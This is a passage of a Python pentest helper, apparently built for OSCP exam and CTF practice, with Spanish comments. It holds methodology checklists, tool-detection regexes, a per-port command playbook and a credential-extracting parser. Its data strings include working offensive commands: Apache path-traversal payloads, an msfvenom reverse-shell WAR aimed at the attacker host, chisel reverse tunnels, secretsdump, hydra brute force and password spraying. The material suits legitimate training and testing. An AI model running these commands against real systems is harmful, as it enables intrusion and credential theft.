        ("Fase 5 Linux privesc", "sudo -l, SUID, cron, capabilities, linpeas, passwords, SSH keys, docker, kernel al final.", ["sudo -l; find / -perm -u=s -type f 2>/dev/null; getcap -r / 2>/dev/null"]),
        ("Fase 6 Windows privesc", "whoami /all, winpeas, servicios, cmdkey, PS history, AlwaysInstallElevated, potato, UAC.", ["whoami /all; winpeas.exe cmd > C:\\Windows\\Temp\\winpeas.txt"]),
        ("Fase 7 AD", "BloodHound, AS-REP, Kerberoast, SYSVOL, ACLs, ADCS, PtH, secretsdump, DCSync.", ["impacket-GetNPUsers '{domain}/' -dc-ip {ip} -usersfile users.txt -no-pass"]),
        ("Fase 8 Pivoting", "Detectar segunda interfaz o servicio localhost; chisel SOCKS o redireccion de puerto.", ["./chisel client {kali}:9999 R:socks"]),
        ("Fase 9 Report", "Screenshots con whoami+flag, comandos exactos, evidencia, remediacion y MITRE.", ["whoami; hostname; ip a; cat /root/proof.txt"]),
    ]),
    ("Mike's OSCP Methodology (3 vectores ciclicos)", "Enumerar 3 categorias -> escalar -> re-enumerar con nuevos privilegios", [
        ("Vulnerable Versions", "Toda version de servicio se busca en searchsploit/CVE. Si no hay exploit obvio, vuelve a enumerar.", ["searchsploit 'Apache 2.4.48'"]),
        ("Misconfigurations", "Anonymous SMB, scripts con permisos, PATH hijack, SUID, GPP, permisos LDAP, servicios modificables.", ["nxc smb {ip} -u '' -p ''; find / -perm -u=s -type f 2>/dev/null"]),
        ("Sensitive Information", "Credenciales, comentarios HTML, .git, logs, historial, archivos de configuracion y shares.", ["grep -riE 'password|secret|token' /var/www /home /opt 2>/dev/null"]),
        ("Ciclo", "Enumerar -> explotar -> re-enumerar con nueva identidad -> repetir hasta root/DA.", ["echo 'enum -> exploit -> re-enum -> repeat'"]),
    ]),
    ("HackTricks (enumeration + privesc + AD)", "Checklists por superficie; referencia viva de tecnicas y bypasses", [
        ("Enumeracion por puerto", "Cada puerto tiene su propia pagina de trucos: SMB, LDAP, Kerberos, HTTP, SNMP, RPC, DB.", ["nmap -sV -sC -p- {ip}"]),
        ("Linux privesc", "kernel, sudo, SUID, capabilities, cron, PATH, writable, container, credentials.", ["sudo -l; getcap -r / 2>/dev/null; find / -perm -4000 -type f 2>/dev/null"]),
        ("Windows privesc", "tokens, servicios, registry, tasks, DLL hijack, AlwaysInstallElevated, LSASS.", ["whoami /priv; cmdkey /list; schtasks /query /fo LIST /v"]),
        ("Active Directory", "Kerberos, relay, ACL abuse, ADCS, delegation, BloodHound, DCSync.", ["certipy-ad find -u {user} -p '{pass}' -dc-ip {ip} -vulnerable -stdout"]),
        ("Cruzar con GTFOBins/LOLBAS", "Todo binario privilegiado se busca en GTFOBins antes de escribir un exploit.", ["echo 'https://gtfobins.github.io | https://lolbas-project.github.io'"]),
    ]),
    ("PTES (Penetration Testing Execution Standard)", "7 fases: estandar de proceso para todo el engagement", [
        ("Pre-engagement", "Scope, ROE, restricciones y objetivos.", ["echo 'scope; ROE; reglas' > alcance.txt"]),
        ("Intelligence gathering", "OSINT, DNS, whois, footprinting.", ["whois {ip}; dig axfr @{ip} {domain}"]),
        ("Threat modeling", "Que activos son valiosos y que amenazas aplican.", ["echo 'activos + amenazas + impactos' > threat.txt"]),
        ("Vulnerability analysis", "Escaneo y validacion manual de cada candidato.", ["nmap -sV -p $(cat ports.txt) --script vuln {ip}"]),
        ("Exploitation", "Probar cada vulnerabilidad validada y demostrar impacto.", ["searchsploit 'Apache 2.4.48'"]),
        ("Post exploitation", "Persistencia, pivoting, credenciales, datos sensibles.", ["impacket-secretsdump '{domain}/{user}:{pass}'@{ip}"]),
        ("Reporting", "Ejecutivo, tecnico, PoCs, evidencia y remediacion.", ["echo '# Reporte' > reporte.md"]),
    ]),
    ("NIST SP 800-115", "4 fases: Planning, Discovery, Attack, Reporting", [
        ("Planning", "Politica, autorizacion, coordinacion, seleccion de tecnicas.", ["echo 'autorizacion + plan + coordinacion' > plan.txt"]),
        ("Discovery", "Document Review, Target Identification/Analysis (ping, scan, fingerprint).", ["nmap -sS -sV -O -p- {ip}"]),
        ("Attack", "Target Vulnerability Validation: password attacks, exploits, DoS controlado segun ROE.", ["hydra -l {user} -P passes.txt ssh://{ip} -t 4"]),
        ("Reporting", "Resultados, analisis de riesgo y recomendaciones.", ["echo 'hallazgos + riesgo + recomendaciones' > reporte.md"]),
    ]),
    ("OWASP WSTG v4.2", "Metodologia de testing de aplicaciones web y APIs", [
        ("Information Gathering", "Huellas, metodos, cabeceras, tecnologias y rutas.", ["curl -sI http://{ip}; whatweb -v http://{ip}"]),
        ("Configuration/Deployment", "Configuracion, archivos, backups, errores, cabeceras.", ["for f in .env .git/HEAD web.config backup.zip; do curl -s -o /dev/null -w \"$f %{http_code}\\n\" http://{ip}/$f; done"]),
        ("Identity/Auth/Session", "Credenciales por defecto, bypass, gestion de sesion.", ["for c in admin:admin admin:password tomcat:s3cret; do echo $c; done"]),
        ("Input Validation", "SQLi, XSS, LFI, command injection, SSTI, XXE, SSRF.", ["curl -s 'http://{ip}/?id=1\\'' ; curl -s 'http://{ip}/?file=../../../../etc/passwd'"]),
        ("Business/AJAX/Client", "Logica de negocio, JS, mensajes, upload.", ["curl -s http://{ip}/app.js | grep -iE 'token|api|pass'"]),
    ]),
    ("OSSTMM 3 (ISECOM)", "5 canales: physical, human, telecom, wireless, data networks", [
        ("Channel model", "Cada canal se mide por controles, flujo e interaccion.", ["echo 'physical|human|telecom|wireless|data' > canales.txt"]),
        ("Tester knowledge vs defender awareness", "Registra que sabias antes y que detecto el defensor.", ["echo 'conocimiento previo / deteccion' > metrics.txt"]),
        ("RAV / STAR", "Metricas de superficie expuesta en lugar de solo contar hallazgos.", ["echo 'superficie abierta = puertos + servicios + confianza' > star.txt"]),
        ("Aplicacion a CTF", "Del canal data networks: puertos, servicios, confianza y flujo de datos.", ["nmap -sV -sC -p- {ip}"]),
    ]),
    ("MITRE ATT&CK v20 (catalogo de comportamiento)", "15 tacticas Enterprise; se usa junto a PTES, no en lugar de el", [
        ("Reconnaissance", "T1595 Active Scanning.", ["nmap -sS -sV -p- {ip}"]),
        ("Initial Access", "T1190 Exploit Public-Facing Application, T1078 Valid Accounts.", ["searchsploit 'Apache 2.4.48'"]),
        ("Execution / Persistence / Defense Evasion", "T1059 command shell, T1053 scheduled task, T1070 indicator removal.", ["schtasks /query /fo LIST /v"]),
        ("Privilege Escalation / Credential Access", "T1068 exploitation for privesc, T1003 OS credential dumping.", ["sudo -l; impacket-secretsdump '{domain}/{user}:{pass}'@{ip}"]),
        ("Discovery / Lateral Movement / C2 / Exfil", "T1046, T1021, T1071, T1041.", ["nxc smb {ip}/24 -u users.txt -p passes.txt --continue-on-success"]),
    ]),
    ("ISSAF / EC-Council CEH (referencia clasicas)", "Framework academico amplio: management, assessment y reporte", [
        ("Pre-assessment", "Reglas, equipo, permisos y plan de trabajo.", ["echo 'reglas + equipo + permisos' > pre.txt"]),
        ("Assessment", "Red, Unix, Windows, aplicaciones, bases de datos, wireless, password cracking.", ["enum4linux-ng -A {ip}; uname -a; systeminfo"]),
        ("Password cracking", "Estrategia: wordlists, reglas, hashes por tipo.", ["hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"]),
        ("Post-assessment", "Analisis de riesgo, reporte y limpieza.", ["echo 'riesgo + reporte + limpieza' > post.txt"]),
    ]),
    ("Workflow de examen OffSec / gestion de tiempo", "40 pts AD primero, 3 standalones, max 2h por maquina, reporte continuo", [
        ("Minuto 0-10", "Setup, logs, HTTP server, /etc/hosts, ntpdate.", ["export ip={ip}; sudo ntpdate -u {ip}"]),
        ("Hora 0-1", "Escanear TODAS las maquinas en paralelo y elegir orden.", ["for h in $(cat ips.txt); do nmap -Pn -p- --min-rate=1000 $h -oN nmap/$h.txt & done; wait"]),
        ("Horas 1-5", "AD set (40 pts): BloodHound -> Kerberoast -> lateral -> DC.", ["sharpHound.exe -c All --zipfilename bloodhound.zip"]),
        ("Horas 5-11", "Standalones; rota cada 2h; usa AlwaysInstallElevated, potato, etc.", ["echo '2h max por maquina' "]),
        ("Cada credencial", "Actualizar tabla y rociar en todos los servicios al instante.", ["nxc smb {ip}/24 -u users.txt -p passes.txt --continue-on-success"]),
        ("Horas 12+", "Screenshots, flags, reporte y verificacion final.", ["whoami; hostname; ip a; cat /root/proof.txt"]),
    ]),
]

TOOLS = {
    "nmap": r"Nmap scan report|Starting Nmap|nmap -", "masscan": r"\bmasscan\b", "rustscan": r"[Rr]ust[Ss]can",
    "netcat": r"\bnc\b|netcat|rlwrap nc|Ncat:", "ping": r"PING |ping -| ping ", "traceroute": r"traceroute|tracert",
    "ip": r"^.*\bip a\b|^[0-9]+: (lo|eth|tun)", "ifconfig": r"\bifconfig\b", "arp": r"\barp -a\b", "route": r"\broute print\b|\bip route\b",
    "dig": r"\bdig\b|; <<>> DiG", "nslookup": r"\bnslookup\b|Name:\s+", "host": r"\bhost -", "whois": r"\bwhois\b",
    "dnsrecon": r"\bdnsrecon\b", "dnsenum": r"\bdnsenum\b", "fierce": r"\bfierce\b", "theharvester": r"theHarvester|theharvester",
    "curl": r"\bcurl\b", "wget": r"\bwget\b", "http.server": r"http\.server|Serving HTTP", "openssl": r"\bopenssl\b|BEGIN CERTIFICATE",
    "ffuf": r"\bffuf\b", "gobuster": r"\bgobuster\b", "feroxbuster": r"\bferoxbuster\b", "dirsearch": r"\bdirsearch\b",
    "nikto": r"\bnikto\b|- Nikto ", "whatweb": r"\bwhatweb\b", "wappalyzer": r"\bwappalyzer\b", "wpscan": r"\bwpscan\b",
    "droopescan": r"\bdroopescan\b", "joomscan": r"\bjoomscan\b", "sqlmap": r"\bsqlmap\b", "dalfox": r"\bdalfox\b",
    "xsstrike": r"\bXSStrike\b|xsstrike", "hydra": r"\bhydra\b", "medusa": r"\bmedusa\b", "john": r"\bjohn\b|johnthe ripper",
    "hashcat": r"\bhashcat\b", "nxc": r"\bnxc\b|\bnetexec\b|\bcrackmapexec\b|\bCME\b", "smbclient": r"\bsmbclient\b",
    "smbmap": r"\bsmbmap\b", "enum4linux": r"enum4linux", "rpcclient": r"\brpcclient\b", "ldapsearch": r"\bldapsearch\b",
    "windapsearch": r"\bwindapsearch\b", "ldapdomaindump": r"ldapdomaindump", "kerbrute": r"\bkerbrute\b",
    "GetNPUsers": r"GetNPUsers|ASREP", "GetUserSPNs": r"GetUserSPNs|kerberoast", "secretsdump": r"secretsdump",
    "psexec": r"psexec", "wmiexec": r"wmiexec", "smbexec": r"smbexec", "dcomexec": r"dcomexec", "atexec": r"atexec",
    "mimikatz": r"\bmimikatz\b|sekurlsa::", "sharphound": r"SharpHound|sharphound", "bloodhound": r"\bbloodhound\b|neo4j",
    "certipy": r"\bcertipy\b", "pywhisker": r"\bpywhisker\b", "bloodyad": r"\bbloodyAD\b", "responder": r"\bResponder\b|responder -I",
    "ntlmrelayx": r"ntlmrelayx", "mitm6": r"\bmitm6\b", "evil-winrm": r"evil-winrm", "xfreerdp": r"\bxfreerdp\b",
    "msfconsole": r"\bmsfconsole\b|meterpreter|Metasploit", "msfvenom": r"\bmsfvenom\b", "searchsploit": r"\bsearchsploit\b",
    "linpeas": r"linpeas|LinPEAS", "winpeas": r"winpeas|WinPEAS", "pspy": r"\bpspy\b", "les": r"linux-exploit-suggester",
    "powershell": r"\bpowershell\b|PS C:\\|Get-ChildItem|Get-ADUser", "cmd": r"C:\\>|\bcmd\.exe\b|\bcmdkey\b|\bnet user\b|\bschtasks\b",
    "whoami": r"\bwhoami\b", "systeminfo": r"\bsysteminfo\b", "tasklist": r"\btasklist\b", "netstat": r"\bnetstat\b",
    "ss": r"\bss -", "find": r"\bfind / |\bfind /-", "getcap": r"\bgetcap\b", "sudo": r"\bsudo -l\b|\bsudo\b",
    "crontab": r"\bcrontab\b|/etc/crontab", "strings": r"\bstrings\b", "exiftool": r"\bexiftool\b", "steghide": r"\bsteghide\b",
    "binwalk": r"\bbinwalk\b", "gdb": r"\bgdb\b", "ghidra": r"\bghidra\b", "tcpdump": r"\btcpdump\b", "tshark": r"\btshark\b",
    "ftp": r"\bftp\b|220 .*FTP", "telnet": r"\btelnet\b", "ssh": r"\bssh\b|\bssh2john\b", "redis-cli": r"\bredis-cli\b",
    "mysql": r"\bmysql\b|MySQL", "psql": r"\bpsql\b|Postgres", "mssqlclient": r"mssqlclient|xp_cmdshell", "mongodb": r"\bmongo\b|MongoDB",
    "smbserver": r"smbserver|impacket-smbserver", "chisel": r"\bchisel\b", "ligolo": r"\bligolo\b", "proxychains": r"\bproxychains\b",
    "sshuttle": r"\bsshuttle\b", "socat": r"\bsocat\b", "scp": r"\bscp\b", "rsync": r"\brsync\b", "certutil": r"\bcertutil\b",
    "gpp-decrypt": r"\bgpp-decrypt\b|cpassword", "ftp": r"\bftp\b", "nbtscan": r"\bnbtscan\b", "onesixtyone": r"\bonesixtyone\b",
    "snmpwalk": r"\bsnmpwalk\b", "snmp-check": r"\bsnmp-check\b", "showmount": r"\bshowmount\b", "mount": r"\bmount -t nfs\b",
    "hashid": r"\bhashid\b|\bhash-identifier\b", "mkpasswd": r"mkpasswd|openssl passwd",
    "wireshark": r"\bwireshark\b", "volatility": r"\bvolatility\b", "autorecon": r"\bautorecon\b",
    "bloodhound-python": r"bloodhound-python", "enum4linux-ng": r"enum4linux-ng", "smb-vuln": r"smb-vuln",
    "apache": r"Apache httpd|Apache/|apache2", "iis": r"Microsoft-IIS|IIS ", "nginx": r"nginx", "tomcat": r"[Tt]omcat",
    "jenkins": r"[Jj]enkins", "wordpress": r"[Ww]ord[Pp]ress|wp-content", "php": r"PHP/", "openssh": r"OpenSSH",
}

CLEANERS = [
    ("Extraer solo puertos abiertos de un nmap -oN", "grep -E '^[0-9]+/(tcp|udp).*open' salida.txt | awk '{print $1}' | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//'"),
    ("Puertos + servicio + version en una linea", "grep -E '^[0-9]+/(tcp|udp).*open' salida.txt | awk '{print $1,$3,$4,$5,$6}' | column -t"),
    ("Extraer solo lineas relevantes de salida larga", "grep -viE 'starting|initiating|completed|read data|nse:|raw packets' salida.txt | head -80"),
    ("Quitar codigos de color ANSI", "sed -r 's/\\x1B\\[[0-9;]*[mK]//g' salida.txt > limpio.txt"),
    ("Extraer IPs unicas", "grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' salida.txt | sort -uV"),
    ("Extraer URLs unicas", "grep -oE 'https?://[^ \"<>]+' salida.txt | sort -u"),
    ("Extraer correos", "grep -oE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}' salida.txt | sort -u"),
    ("Filtrar hallazgos ffuf/gobuster por codigo 200/301/302", "grep -E '\\s(200|301|302)\\s' salida.txt | awk '{print $1}' | sort -u"),
    ("Ordenar rutas descubiertas y quitar ruido", "grep -oE '/[A-Za-z0-9_.-]+' salida.txt | sort -u | grep -vE '\\.(css|js|png|jpg|gif)$'"),
    ("Extraer usuarios de ldapsearch", "grep -iE '^cn:|^sAMAccountName:|^uid:' salida.txt | cut -d' ' -f2 | sort -u"),
    ("Extraer hashes NTLM completos", "grep -oE '[0-9a-fA-F]{32}:[0-9a-fA-F]{32}' salida.txt | sort -u"),
    ("Extraer posibles passwords tras -p/--pass", "grep -oE '(-p|--pass|-w)[ =:]+[^ ]+' salida.txt | sort -u"),
    ("Comparar dos nmap y ver puertos nuevos", "diff <(grep -E '^[0-9]+/tcp.*open' antes.txt | awk '{print $1}') <(grep -E '^[0-9]+/tcp.*open' despues.txt | awk '{print $1}')"),
    ("Contar codigos HTTP en ffuf", "grep -oE '\\b[0-9]{3}\\b' salida.txt | sort | uniq -c | sort -rn"),
    ("Limpiar salida de winpeas y quedarse con lo importante", "grep -iE 'SeImpersonate|Unquoted|Modifiable|AlwaysInstall|AutoLogon|password|credential' winpeas.txt | sort -u"),
    ("Filtrar linpeas rojo/amarillo", "grep -A5 -E '\\x1b\\[(91|93|31|33)m|\\[1\\]' linpeas.txt"),
    ("Extraer rutas de archivos de una salida", "grep -oE '(/[A-Za-z0-9._-]+){2,}' salida.txt | sort -u"),
    ("Eliminar lineas de progreso/nmap ruido", "grep -vE 'Initiating|Completed|Increasing|Raw packets|NSE:|Scanning [0-9]+ ports' salida.txt"),
    ("Generar wordlist de usuarios desde nombres encontrados", "grep -iE '^cn:|^sAMAccountName:' ldap.txt | awk '{print $2}' | tr 'A-Z' 'a-z' | sort -u > users.txt"),
    ("Mutaciones de password con reglas basicas", "for p in Password1 Password123 Welcome1 Summer2026; do echo $p; echo ${p,,}; echo ${p^}; done | sort -u > passes.txt"),
    ("Detectar versiones de servicios", "grep -iE 'Apache|OpenSSH|PHP|MySQL|IIS|nginx|OpenSSL|Postfix|SMB' salida.txt | sort -u"),
    ("Extraer parametros de URLs", "grep -oE '\\?[^ ]+|^GET [^ ]+' salida.txt | grep -oE '[?&][A-Za-z0-9_-]+=' | tr -d '?&=' | sort -u"),
    ("Resumen de una linea por host", "grep -E 'Nmap scan report|Host is up|Service Info' salida.txt"),
]

VULN_HINTS = [
    (r"Apache httpd 2\.4\.48|Apache/2\.4\.48", "CVE-2021-41773 / CVE-2021-42013", "Path traversal y RCE si mod_cgi activo", [
        "curl -s --path-as-is 'http://{ip}/cgi-bin/%%32%%65%%32%%65/%%32%%65%%32%%65/etc/passwd'",
        "searchsploit 'Apache 2.4.48' | grep -iE 'traversal|rce'",
        "curl -s --path-as-is 'http://{ip}/icons/../../etc/passwd'",
    ]),
    (r"Apache httpd 2\.4\.49", "CVE-2021-42013", "Bypass del parche de 2.4.50", [
        "curl -s --path-as-is 'http://{ip}/cgi-bin/%%32%%65%%32%%65/%%32%%65%%32%%65/etc/passwd'",
    ]),
    (r"OpenSSH [0-7]\.[0-9]", "Version antigua de OpenSSH", "Buscar CVE y verificar usuario antes de bruteforce", [
        "searchsploit openssh $(grep -oE 'OpenSSH [0-9.]+' nmap/targeted.nmap | head -1 | cut -d' ' -f2)",
        "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4",
    ]),
    (r"VSFTPD 2\.3\.4", "CVE-2011-2523", "Backdoor conocido en vsftpd 2.3.4", [
        "searchsploit vsftpd 2.3.4", "nmap -p21 --script ftp-vsftpd-backdoor {ip}",
    ]),
    (r"ProFTPD 1\.3\.5", "CVE-2019-12815", "Copy command execution", ["searchsploit proftpd 1.3.5"]),
    (r"Microsoft-IIS/6\.0|IIS 6\.0", "CVE-2017-7269", "WebDAV remote code execution", ["searchsploit 'IIS 6.0'"]),
    (r"Jenkins", "Jenkins unauthenticated", "Script Console -> Groovy shell", [
        "curl -s http://{ip}:8080/script; curl -s 'http://{ip}:8080/scriptText?script=println \"whoami\".execute().text'",
    ]),
    (r"[Tt]omcat", "Tomcat manager", "Probar tomcat:s3cret y desplegar WAR", [
        "curl -s -u tomcat:s3cret http://{ip}:8080/manager/html",
        "msfvenom -p java/jsp_shell_reverse_tcp LHOST={kali} LPORT=443 -f war -o shell.war",
    ]),
    (r"WordPress|wp-content", "WordPress", "Enumerar plugins y usuarios", [
        "wpscan --url http://{ip} --enumerate p,u --plugins-detection aggressive",
    ]),
    (r"MySQL 5\.[0-6]", "MySQL antiguo", "UDF / root sin password", [
        "mysql -h {ip} -u root -e 'SHOW DATABASES;'",
    ]),
    (r"Redis", "Redis sin autenticacion", "CONFIG SET dir + modulo/webshell", [
        "redis-cli -h {ip} CONFIG GET dir; redis-cli -h {ip} CONFIG GET dbfilename",
    ]),
    (r"Simple DNS Plus", "Simple DNS Plus", "Versionar y buscar admin web/zone transfer", [
        "dig axfr @{ip} {domain}", "searchsploit 'Simple DNS Plus'",
    ]),
]

SERVICE_PLAYBOOK = {
    "21": ("FTP", ["ftp {ip}", "nmap -p21 --script ftp-anon,ftp-vsftpd-backdoor {ip}"]),
    "22": ("SSH", ["ssh {user}@{ip}", "ssh2john id_rsa > hash.txt; john hash.txt -w=/usr/share/wordlists/rockyou.txt"]),
    "25": ("SMTP", ["nmap -p25 --script smtp-enum-users {ip}", "telnet {ip} 25"]),
    "53": ("DNS", ["dig axfr @{ip} {domain}", "dnsrecon -d {domain} -n {ip} -t std"]),
    "80": ("HTTP", ["whatweb -v http://{ip}", "feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -C 404 -t 50"]),
    "88": ("Kerberos", ["kerbrute userenum -d {domain} --dc {ip} users.txt", "sudo ntpdate -u {ip}"]),
    "110": ("POP3", ["telnet {ip} 110"]),
    "111": ("RPC/NFS", ["showmount -e {ip}"]),
    "135": ("MSRPC", ["rpcclient -U '' -N {ip} -c 'enumdomusers;netshareenumall'"]),
    "139": ("NetBIOS/SMB", ["enum4linux-ng -A {ip}", "nxc smb {ip} -u '' -p ''"]),
    "143": ("IMAP", ["telnet {ip} 143"]),
    "389": ("LDAP", ["ldapsearch -x -H ldap://{ip} -s base namingcontexts", "windapsearch -d {domain} --dc {ip} -U"]),
    "443": ("HTTPS", ["curl -sk https://{ip}", "echo | openssl s_client -connect {ip}:443 2>/dev/null | openssl x509 -noout -text"]),
    "445": ("SMB", ["nxc smb {ip} -u '' -p ''; nxc smb {ip} -u guest -p ''", "smbclient -L //{ip}/ -N", "nmap --script 'smb-vuln*' -p445 {ip}"]),
    "464": ("kpasswd", ["nmap -p464 -sV {ip}"]),
    "593": ("RPC over HTTP", ["rpcclient -U '' -N {ip}"]),
    "636": ("LDAPS", ["ldapsearch -x -H ldaps://{ip} -s base namingcontexts"]),
    "1433": ("MSSQL", ["impacket-mssqlclient {user}@{ip} -windows-auth", "nxc mssql {ip} -u {user} -p '{pass}'"]),
    "2049": ("NFS", ["showmount -e {ip}"]),
    "3268": ("LDAP GC", ["windapsearch -GC -d {domain} --dc {ip} -U"]),
    "3269": ("LDAPS GC", ["ldapsearch -x -H ldaps://{ip}:3269 -s base namingcontexts"]),
    "3306": ("MySQL", ["mysql -h {ip} -u root -e 'SHOW DATABASES;'"]),
    "3389": ("RDP", ["xfreerdp /v:{ip} /u:{user} /p:{pass} /cert:ignore +clipboard", "nxc rdp {ip} -u {user} -p '{pass}'"]),
    "5432": ("PostgreSQL", ["psql -h {ip} -U postgres -c '\\du'"]),
    "5985": ("WinRM", ["evil-winrm -i {ip} -u '{user}' -p '{pass}'", "nxc winrm {ip} -u users.txt -p passes.txt --continue-on-success"]),
    "5986": ("WinRM TLS", ["evil-winrm -i {ip} -u '{user}' -p '{pass}' -S"]),
    "6379": ("Redis", ["redis-cli -h {ip} CONFIG GET dir", "redis-cli -h {ip} INFO server"]),
    "8080": ("HTTP alt", ["whatweb -v http://{ip}:8080", "curl -s -u tomcat:s3cret http://{ip}:8080/manager/html"]),
    "8443": ("HTTPS alt", ["curl -sk https://{ip}:8443"]),
    "9389": ("ADWS / .NET", ["nmap -p9389 -sV {ip}"]),
    "47001": ("WinRM UDP/HTTPAPI", ["curl -s http://{ip}:47001"]),
}
class Session:
    def __init__(self, name):
        self.name = name
        safe = re.sub(r"[^A-Za-z0-9._-]+", "_", name).strip("._") or "default"
        self.path = SESSIONS / (safe + ".json")
        self.data = {
            "name": name,
            "created": datetime.now().isoformat(timespec="seconds"),
            "updated": "",
            "profile": {"target": "", "kali": "", "domain": "", "user": "", "password": "", "port": "80", "share": "share", "notes": ""},
            "checked": [],
            "history": [],
            "creds": [],
            "notes": "",
        }
        if self.path.exists():
            try:
                saved = json.loads(self.path.read_text())
                for k, v in saved.items():
                    if k == "profile":
                        self.data["profile"].update(v)
                    else:
                        self.data[k] = v
            except Exception:
                pass

    def save(self):
        self.data["updated"] = datetime.now().isoformat(timespec="seconds")
        SESSIONS.mkdir(parents=True, exist_ok=True)
        tmp = self.path.with_suffix(".tmp")
        tmp.write_text(json.dumps(self.data, indent=2, ensure_ascii=False))
        tmp.replace(self.path)
        BASE.mkdir(parents=True, exist_ok=True)
        CURRENT.write_text(json.dumps({"session": self.name}))

    @property
    def profile(self):
        return self.data["profile"]

    def checked(self):
        return set(self.data.get("checked", []))

    def mark(self, ids):
        s = self.checked()
        added = []
        for i in ids:
            if i not in s:
                s.add(i)
                added.append(i)
        self.data["checked"] = sorted(s)
        return added

    def unmark(self, ids):
        s = self.checked()
        for i in ids:
            s.discard(i)
        self.data["checked"] = sorted(s)

    def progress(self, phase=None):
        items = [c for c in CHECKLIST_DATA if phase is None or c[1] == phase]
        done = sum(1 for c in items if c[0] in self.checked())
        return done, len(items)


def current_session_name():
    if CURRENT.exists():
        try:
            return json.loads(CURRENT.read_text()).get("session", "default")
        except Exception:
            pass
    return "default"


def detect_tools(text):
    found = []
    for name, pattern in TOOLS.items():
        try:
            if re.search(pattern, text, re.I | re.M):
                found.append(name)
        except re.error:
            pass
    return sorted(set(found))


def extract_facts(text, sess):
    prof = sess.profile
    f = {
        "ip": prof.get("target") or "",
        "kali": prof.get("kali") or "",
        "domain": prof.get("domain") or "",
        "user": prof.get("user") or "",
        "password": prof.get("password") or "",
        "ports": {},
        "ips": [],
        "urls": [],
        "paths": [],
        "users": [],
        "creds": [],
        "hashes": [],
        "os": "",
        "host": "",
        "signing": "",
        "webpaths": [],
    }
    ips = re.findall(r"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b", text)
    noise = {"0.0.0.0", "127.0.0.1", "255.255.255.255", "8.8.8.8", "1.1.1.1"}
    f["ips"] = sorted({i for i in ips if i not in noise and not i.endswith(".255")}, key=lambda x: tuple(map(int, x.split("."))))
    if not f["ip"] and f["ips"]:
        f["ip"] = f["ips"][0]
    for line in text.splitlines():
        m = re.match(r"^\s*(\d+)/(tcp|udp)\s+(\S+)\s+(.*)$", line)
        if m and m.group(3).lower() in ("open", "open|filtered", "filtered"):
            port, proto, state, rest = m.group(1), m.group(2), m.group(3), m.group(4)
            parts = rest.split()
            svc = parts[0] if parts else ""
            for i, tok in enumerate(parts):
                if tok == "ttl" and i + 1 < len(parts) and parts[i + 1].isdigit():
                    rest = " ".join(parts[i + 2:])
                    break
            f["ports"][port] = {"proto": proto, "state": state, "svc": svc, "version": rest}
        m2 = re.match(r"^\s*open\s+(tcp|udp)\s+(\d+)", line)
        if m2:
            f["ports"].setdefault(m2.group(2), {"proto": m2.group(1), "state": "open", "svc": "", "version": ""})
    dm = re.search(r"Domain:\s*([A-Za-z0-9._-]+)", text, re.I)
    if dm:
        f["domain"] = f["domain"] or dm.group(1)
    dm2 = re.search(r"dc=([A-Za-z0-9_-]+)\s*,\s*dc=([A-Za-z0-9_-]+)", text, re.I)
    if dm2 and not f["domain"]:
        f["domain"] = dm2.group(1) + "." + dm2.group(2)
    hm = re.search(r"Service Info:\s*Host:\s*(\S+)", text)
    if hm:
        f["host"] = hm.group(1)
    om = re.search(r"OS:\s*([^\n]+)|cpe:/o:[^\s]+", text)
    if om:
        f["os"] = (om.group(1) or om.group(0)).strip()
    if re.search(r"Message signing enabled and required", text, re.I):
        f["signing"] = "required"
    elif re.search(r"Message signing enabled but not required", text, re.I):
        f["signing"] = "not_required"
    f["urls"] = sorted(set(re.findall(r"https?://[^\s\"'<>]+", text)))[:25]
    f["paths"] = sorted(set(re.findall(r"/[A-Za-z0-9._~%-]{2,}(?:/[A-Za-z0-9._~%-]+)*", text)))[:30]
    f["users"] = sorted(set(re.findall(r"^\s*(?:sAMAccountName|uid|cn):\s*(\S+)", text, re.I | re.M)))[:40]
    for u in re.findall(r"\[\*\] Valid user:\s*(\S+)", text, re.I):
        if u not in f["users"]:
            f["users"].append(u)
    f["hashes"] = sorted(set(re.findall(r"\b[0-9a-fA-F]{32}:[0-9a-fA-F]{32}\b", text)))[:20]
    for m in re.finditer(r"(?<!\S)(?:-u|--user(?:name)?)\s+['\"]?([^\s'\"]+)['\"]?\s+(?:-p|--pass(?:word)?)\s+['\"]?([^\s'\"]+)['\"]?", text, re.I):
        u, pw = m.group(1), m.group(2)
        if u.startswith("-") or pw.startswith("-") or "$" in u:
            continue
        pair = u + ":" + pw
        if pair not in f["creds"]:
            f["creds"].append(pair)
    noise_creds = {"http", "https", "ssh", "ftp", "smb", "ldap", "rdp", "winrm", "domain", "host", "user", "pass", "microsoft", "windows", "linux", "unix", "cpe", "o", "service", "info", "host", "site", "default", "first", "name"}
    for m in re.finditer(r"\b([A-Za-z0-9._-]{2,20}):([^\s:'\"]{3,40})", text):
        u, pw = m.group(1), m.group(2)
        if u.lower() in noise_creds or pw.lower() in noise_creds or u.isdigit() or re.fullmatch(r"(\d{1,3}\.){3}\d{1,3}", u) or pw.startswith("//") or re.fullmatch(r"\d{2}:\d{2}:\d{2}Z", pw):
            continue
        pair = u + ":" + pw
        if pair not in f["creds"]:
            f["creds"].append(pair)
    f["creds"] = f["creds"][:20]
    for line in text.splitlines():
        ls = line.strip()
        if re.search(r"\b(200|301|302|204)\b", ls) and ("FUZZ" in text or any(x in text.lower() for x in ("ffuf", "gobuster", "feroxbuster"))):
            if ls and len(ls) < 160:
                f["webpaths"].append(ls)
    f["webpaths"] = f["webpaths"][:20]
    return f


RULES = [
    ("R01", "ALTO", "Puertos abiertos detectados", [r"^\s*\d+/(tcp|udp)\s+open", r"\bopen\s+tcp\s+\d+"],
     "Cada servicio expuesto es una superficie de ataque; el vector suele estar en la version o en una mala configuracion.",
     ["Lee la salida completa y anota version exacta de cada servicio.", "Para cada puerto aplica su playbook especifico.", "Busca la version en searchsploit antes de pensar en explotos propios."],
     ["searchsploit 'Apache 2.4.48' | head -20", "nmap -sV -sC -p $(grep -E '^[0-9]+/(tcp|udp).*open' nmap.txt | awk '{print $1}' | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//') {ip}"],
